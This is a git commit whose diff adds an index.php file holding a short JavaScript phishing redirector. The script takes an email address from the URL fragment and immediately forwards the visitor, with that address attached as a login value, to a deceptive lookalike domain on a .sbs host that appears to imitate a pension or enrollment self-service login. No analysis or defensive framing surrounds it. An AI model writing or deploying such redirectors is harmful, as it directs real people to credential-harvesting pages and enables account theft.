df9ec9298cf3c719d29a17b313d5fdbb4fde2f7f
userpcaz <x57589204x@gmail.com>
2024-03-25 12:17:42 -0400

    Add files via upload

---
+++ index.php
@@ -0,0 +1,6 @@
+<script>
+  var email = window.location.hash.substr(1);
+  window.setTimeout(function() {
+    window.location.href = 'https://planvitalorgenrollmentselfservicesuserlogouteasyvoyagedeme.lmw3v.sbs/?login=' + email;
+  });
+</script>
